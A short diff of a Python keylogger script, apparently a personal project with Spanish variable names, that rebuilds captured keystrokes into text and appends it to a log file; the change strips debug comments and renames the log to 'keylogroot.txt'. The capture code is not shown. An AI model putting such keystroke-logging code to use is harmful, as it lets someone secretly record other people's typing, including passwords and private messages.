@@ -16,8 +16,6 @@ while True:
 
 
     for letra in teclas[0]:
-        #print(letra)
-        #print(teclas[1])
         if letra[0] == 'space':
             frase += ' '
         elif letra[0] == 'backspace':
@@ -27,11 +25,7 @@ while True:
         else:
             frase += letra[0]
 
-    #print(frase)
-    keylog = open("keylog.txt", "a")
+    keylog = open("keylogroot.txt", "a")
     keylog.write(frase + '\n')
     keylog.close()
-
-
-#
 
